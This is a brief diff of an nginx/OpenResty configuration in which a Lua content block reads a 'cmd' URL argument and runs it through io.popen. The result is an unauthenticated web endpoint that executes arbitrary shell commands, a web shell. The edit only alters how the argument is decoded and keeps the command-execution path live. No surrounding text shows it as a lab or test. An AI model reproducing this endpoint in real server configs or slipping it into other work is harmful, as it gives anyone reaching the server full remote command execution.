@@ -34,7 +34,7 @@ http {
       set_unescape_uri $cmd $arg_cmd;
 
       content_by_lua '
-          local cmd = url_decode(ngx.var["cmd"])
+          local cmd = ngx.var["cmd"]
           ngx.print("command: ", cmd, "\\n")
 
           local handle = io.popen(cmd)
